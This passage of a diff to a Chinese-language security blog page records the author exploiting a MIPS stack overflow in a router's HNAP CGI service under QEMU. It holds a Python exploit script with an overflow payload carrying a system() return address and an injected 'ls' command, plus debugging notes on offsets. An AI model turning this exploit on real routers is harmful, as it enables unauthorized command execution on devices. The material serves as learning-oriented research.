xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span><br><span class="hljs-string">    xmlns:a=&quot;http://purenetworks.com/HNAP1/&quot;&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    &lt;soap:Body&gt;</span><br><span class="hljs-string">        &lt;a:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA /&gt;</span><br><span class="hljs-string">    &lt;/soap:Body&gt;ls</span><br><span class="hljs-string"></span><br><span class="hljs-string">&lt;/soap:Envelope&gt;&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># 模拟 CGI 环境变量</span><br>REQUEST_METHOD = <span class="hljs-string">&quot;POST&quot;</span><br>SOAP_ACTION = <span class="hljs-string">&quot;1&quot;</span><br>COOKIE = <span class="hljs-string">&quot;1&quot;</span><br><span class="hljs-comment"># 注意：在真实的 HTTP 请求中，CONTENT_LENGTH 应该与 http_body 的真实长度一致</span><br>CONTENT_LENGTH = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(http_body)) <br><br><br>system_addr = <span class="hljs-number">0x4033E8</span><br><span class="hljs-comment"># 触发栈溢出的 Payload (De Bruijn 序列)</span><br>HNAP_AUTH =<span class="hljs-string">b&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaak&quot;</span> +<span class="hljs-string">b&quot;aaaa&quot;</span>+<span class="hljs-string">b&quot;baalcaaldaaleaalfaalgaalhaaliaal&quot;</span>+<span class="hljs-string">b&quot; \x40\x33\xe8&quot;</span>+<span class="hljs-string">b&quot;kaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaal  aaaaaa&quot;</span><br><br><span class="hljs-comment"># 启动程序并注入环境变量和输入流</span><br>subprocess.run(<br>    [<span class="hljs-string">&#x27;/qemu-mips&#x27;</span>, <span class="hljs-string">&#x27;-g&#x27;</span>, <span class="hljs-string">&#x27;1234&#x27;</span>, <span class="hljs-string">&#x27;/web/cgi-bin/hnap/hnap_service&#x27;</span>],<br>    <span class="hljs-built_in">input</span>=http_body,  <span class="hljs-comment"># 这里传入我们定义好的 XML 字节流</span><br>    env=&#123;<br>        <span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>: REQUEST_METHOD,<br>        <span class="hljs-string">&#x27;SOAP_ACTION&#x27;</span>: SOAP_ACTION,<br>        <span class="hljs-string">&#x27;CONTENT_LENGTH&#x27;</span>: CONTENT_LENGTH,<br>        <span class="hljs-string">&#x27;COOKIE&#x27;</span>: COOKIE,<br>        <span class="hljs-string">&#x27;HNAP_AUTH&#x27;</span>: HNAP_AUTH<br>    &#125;<br>)<br><br><br></code></pre></td></tr></table></figure>
 
-<img src="/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512180635545.png" srcset="/img/loading.gif" lazyload class="" title="image-20260512180635545">
+<img src="/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512180635545.png" srcset="/img/loading.gif" lazyload class="" title="image-20260512180635545">
 
 <p>测试ls能写到堆上，那么就能拼接利用这个地址</p>
 <p>然后S0也与预期一样被设置成了aaaa</p>
-<img src="/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512180745536.png" srcset="/img/loading.gif" lazyload class="" title="image-20260512180745536">
+<img src="/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512180745536.png" srcset="/img/loading.gif" lazyload class="" title="image-20260512180745536">
 
 
 
 <p>和预期一样，接下来直接将ls作为S0拼接进去。但是实践时还是出现了一些问题。</p>
 <p>例如：</p>
-<img src="/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512181621569.png" srcset="/img/loading.gif" lazyload class="" title="image-20260512181621569">
+<img src="/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512181621569.png" srcset="/img/loading.gif" lazyload class="" title="image-20260512181621569">
 
 <p>实操时，偏移量又发生变化了，不知为何，试试改一下偏移量</p>
-<img src="/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512184347172.png" srcset="/img/loading.gif" lazyload class="" title="image-20260512184347172">
+<img src="/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512184347172.png" srcset="/img/loading.gif" lazyload class="" title="image-20260512184347172">
 
 <p>gp被污染了，找到位置不要覆盖它就好</p>
 <p>然后S0也不在我们一开始预想的位置，再调一调就好了</p>
 <p>终于经过调试慢慢改就成功了，我太菜了又懒，里面具体变化原因懒得管了</p>
 <p>能成功执行就完了。</p>
-<img src="/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512190929579.png" srcset="/img/loading.gif" lazyload class="" title="image-20260512190929579">
+<img src="/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512190929579.png" srcset="/img/loading.gif" lazyload class="" title="image-20260512190929579">
 
 
 
@@ -515,7 +515,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>pwn_bug视频总结</div>
-      <div>https://yy-t1.github.io/2026/05/07/pwn-bug视频总结/</div>
+      <div>https://yy-t1.github.io/2026/05/07/Iot/pwn-bug视频总结/</div>
     </div>
     <div class="license-meta">
       
@@ -559,7 +559,7 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2026/05/12/MIPS%E6%A0%88%E6%BA%A2%E5%87%BA/" title="MIPS栈溢出">
+                      <a href="/2026/05/12/pwn/pwn%E5%9F%BA%E7%A1%80/MIPS%E6%A0%88%E6%BA%A2%E5%87%BA/" title="MIPS栈溢出">
                         <i class="iconfont icon-arrowleft"></i>
                         <span class="hidden-mobile">MIPS栈溢出</span>
                         <span class="visible-mobile">上一篇</span>
@@ -569,7 +569,7 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2026/05/04/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1APP%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" title="记第一次APP漏洞挖掘">
+                      <a href="/2026/05/04/Android/Android%20APP/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1APP%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" title="记第一次APP漏洞挖掘">
                         <span class="hidden-mobile">记第一次APP漏洞挖掘</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
